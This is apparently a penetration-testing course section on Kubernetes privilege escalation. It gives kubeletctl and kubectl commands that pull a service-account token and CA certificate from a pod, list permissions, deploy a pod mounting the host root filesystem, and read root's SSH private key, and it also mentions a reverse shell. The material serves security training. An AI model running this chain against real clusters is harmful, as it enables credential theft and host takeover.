## Privilege Escalation

To gain higher privileges and access the host system, we can utilize a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server. To do this, we must provide the server's IP address, namespace, and target pod. In case we get this token and certificate, we can elevate our privileges even more, move horizontally throughout the cluster, or gain access to additional pods and resources.

#### Kubelet API - Extracting Tokens

Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

```

#### Kubelet API - Extracting Certificates

Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
<SNIP>
MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD

-----END CERTIFICATE-----
```

Now that we have both the `token` and `certificate`, we can check the access rights in the Kubernetes cluster. This is commonly used for auditing and verification to guarantee that users have the correct level of access and are not given more privileges than they need. However, we can use it for our purposes and we can inquire of K8s whether we have permission to perform different actions on various resources.

#### List Privileges

Kubernetes

```shell-session
cry0l1t3@k8:~$ export token=`cat k8.token`
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

Resources										Non-Resource URLs	Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
pods											[]					[]				[get create list]
...SNIP...
```

Here we can see a few very important information. Besides the selfsubject-resources we can `get`, `create`, and `list` pods which are the resources representing the running container in the cluster. From here on, we can create a `YAML` file that we can use to create a new container and mount the entire root filesystem from the host system into this container's `/root` directory. From there on, we could access the host systems files and directories. The `YAML` file could look like following:

#### Pod YAML

Code: yaml

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Once created, we can now create the new pod and check if it is running as expected.

#### Creating a new Pod

Kubernetes

```shell-session
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

pod/privesc created


cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

NAME	READY	STATUS	RESTARTS	AGE
nginx	1/1		Running	0			23m
privesc	1/1		Running	0			12s
```

If the pod is running we can execute the command and we could spawn a reverse shell or retrieve sensitive data like private SSH key from the root user.

#### Extracting Root's SSH Key

Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

-----BEGIN OPENSSH PRIVATE KEY-----
...SNIP...
